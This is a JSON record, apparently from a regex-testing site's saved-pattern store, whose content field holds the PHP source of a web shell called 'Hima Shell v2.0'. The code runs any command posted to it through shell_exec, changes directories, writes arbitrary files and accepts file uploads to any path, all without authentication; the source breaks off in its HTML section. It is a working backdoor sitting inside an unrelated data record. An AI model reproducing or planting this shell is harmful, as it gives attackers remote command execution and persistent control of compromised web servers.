{"id":"171560","urlID":"3b89o","name":"\u064a\u064a","description":"\u064a\u0628\u0639\u0647\u0627\u0647\u0634","content":"<?php\n\/*\n         \n\tSoftware: Hima Shell\n\tAuthor: ViRuS_HiMa\n\tWebsite: www.hell-z0ne.org\n\tEmail: egypt_government@hotmail.com\n        Uploadshell.txt UploadShell.php\n*\/\n\nob_start();\n\n# Get system informations\n$server_os = @PHP_OS;\n$server_uname = @php_uname();\n$server_php = @phpversion();\n$server_sm = @ini_get('safe_mode');\n\n# Set generals variables\n$shell_title = \"Hima\";\n$shell_version = \"v2.0\";\n$shell_action = $PHP_SELF;\n$shell_mode = $_POST['shell_mode'];\n\n# Set the command variables\n$cmd_cnt = $_POST['command'];\n$cmd_check = $_POST['cmdcheck'];\n\n# Set the directory variables\n$dir_check = $_POST['dircheck'];\n$dir_change = $_POST['changedir'];\n$dir_keep = $_POST['keepdir'];\n\n# Set the files variables\n$mkfile_path = $_POST['createfile'];\n$mkfile_cnt = $_POST['createfilecnt'];\n\n# Set the upload file variables\n$upfile_path = $_POST['upfiledir'];\n$upfile_cnt = $_POST['upfile'];\n\n# Get the current working directory\nif(!isset($dir_cur))\n\t$dir_cur = getcwd();\n\n# Check if a change dir command has been sent and keep the previous directory if a new command was launch\nif(isset($dir_check)) {\n\tif(file_exists($dir_change)) {\n\t\tif(function_exists(\"chdir\")) {\n\t\t\t@chdir($dir_change);\n\t\t\t$dir_cur = getcwd();\n\t\t} else {\n\t\t\t$dir_error = \"<i>Error: Cannot change directory!<\/i><br>\\n\";\n\t\t}\n\t} else {\n\t\t$dir_error = \"<i>Error: The directory doesn't exists.<\/i><br>\\n\";\n\t}\n} elseif(isset($dir_keep)) {\n\tif(file_exists($dir_keep)) {\n\t\tif(function_exists(\"chdir\")) {\n\t\t\t@chdir($dir_keep);\n\t\t\t$dir_cur = getcwd();\n\t\t} else {\n\t\t\t$dir_error = \"<i>Error: Cannot change directory!<\/i><br>\\n\";\n\t\t}\n\t} else {\n\t\t$dir_error = \"<i>Error: The directory doesn't exists.<\/i><br>\\n\";\n\t}\n}\n\n# This execute the command specified\nif(isset($cmd_check)) {\n\tif(@function_exists(\"shell_exec\")) {\n\t\t$exec = $cmd_cnt;\n\t\t$tmpfile = tempnam('\/tmp', $shell_title);\n\t\t$exec .= \" 1> $tmpfile 2>&1; \" . \"cat $tmpfile; rm $tmpfile\";\n\t\t$cmd_out = `$exec`;\t\t\n\t} else {\n\t\tdie(\"ERROR: the PHP version running doesn't support `shell_exec()`!  Upgrade it!\\n\");\n\t}\n}\n\n# Creates files\nif(isset($mkfile_path)) {\n\tif(!file_exists($mkfile_path)) {\n\t\tif($mkfile_new = @fopen($mkfile_path, \"w\")) {\n\t\t\t@fputs($mkfile_new, $mkfile_cnt);\n\t\t\t@fclose($mkfile_new);\n\t\t\t$mkfile_msg = \"<i>New file created: \" . $mkfile_path . \"<\/i><br>\\n\";\n\t\t} else {\n\t\t\t$mkfile_msg = \"<i>Error: Permission denied!<\/i><br>\\n\";\n\t\t}\n\t} else {\n\t\t$mkfile_msg = \"<i>Error: The file already exists.<\/i><br>\\n\";\n\t}\n}\n\n# Uploads files\nif(isset($upfile_path)) {\n\t$upfile_name = $_FILES[\"upfile\"][\"name\"];\n\tif(trim($_FILES[\"upfile\"][\"name\"]) == \"\") {\n\t\t$upfile_msg = \"<i>Error: specify a file please.<\/i><br>\\n\";\n\t} else {\n\t\tif(@is_uploaded_file($_FILES[\"upfile\"][\"tmp_name\"])) {\n\t\t\tif(@move_uploaded_file($_FILES[\"upfile\"][\"tmp_name\"], \"$upfile_path\/$upfile_name\"))\n\t\t\t\t$upfile_msg = \"<i>New file uploaded successfully!<\/i><br>\\n\";\n\t\t\telse\n\t\t\t\t$upfile_msg = \"<i>Error: Permission denied!<\/i><br>\\n\";\n\t\t} else {\n\t\t\t$upfile_msg = \"<i>Error: Cannot upload the file!<\/i><br>\\n\";\n\t\t}\n\t}\n}\n\nif(!$shell_mode) {\n?>\n<html>\n<head>\n<title><?php echo $shell_title; ?><\/t","weightedVote":"2.5","numVotes":"0","author":"\u0639\u064a\u0633\u0647\u0639","community":"1","dateAdded":"2015-06-19","pattern":"\/([A-Z])\\w+\/g","replace":"","state":"{\"substEnabled\":false}"}